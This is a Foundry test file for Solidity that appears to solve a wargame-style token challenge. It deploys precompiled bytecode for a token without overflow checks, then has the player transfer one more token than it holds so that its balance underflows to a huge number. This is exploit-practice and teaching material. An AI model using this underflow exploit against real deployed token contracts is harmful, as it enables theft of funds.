// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IToken {
    function balanceOf(address _owner) external view returns (uint256 balance);

    function totalSupply() external view returns (uint256);

    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenTest is Test {
    uint256 public constant INITIAL_SUPPLY = 21000000;
    uint256 public constant PLAYER_SUPPLY = 20;

    IToken internal _token;
    address internal immutable _player = vm.addr(1);

    function setUp() public {
        _token = _deployToken();
        _token.transfer(_player, PLAYER_SUPPLY);
    }

    function test_attack() public {
        vm.startPrank(_player);

        _token.transfer(address(0), PLAYER_SUPPLY + 1);

        vm.stopPrank();

        assertGt(_token.balanceOf(_player), PLAYER_SUPPLY, "player balance");
    }

    function _deployToken() internal returns (IToken) {
        bytes memory code = bytes.concat(
            hex"608060405234801561001057600080fd5b506040516101ab3803806101ab8339818101604052602081101561003357600080fd5b5051600181905533600090815260208190526040902055610152806100596000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806318160ddd1461004657806370a0823114610060578063a9059cbb14610086575b600080fd5b61004e6100c6565b60408051918252519081900360200190f35b61004e6004803603602081101561007657600080fd5b50356001600160a01b03166100cc565b6100b26004803603604081101561009c57600080fd5b506001600160a01b0381351690602001356100e7565b604080519115158252519081900360200190f35b60015481565b6001600160a01b031660009081526020819052604090205490565b33600090815260208190526040808220805484900390556001600160a01b03939093168152919091208054909101905560019056fea2646970667358221220f7ea79fc3359536e5631ec47017783f8655f0f1e840f50d29a6d55dbb4a29bef64736f6c634300060c0033",
            abi.encode(INITIAL_SUPPLY)
        );
        address addr;

        assembly {
            addr := create(0, add(code, 32), mload(code))
        }

        return IToken(addr);
    }
}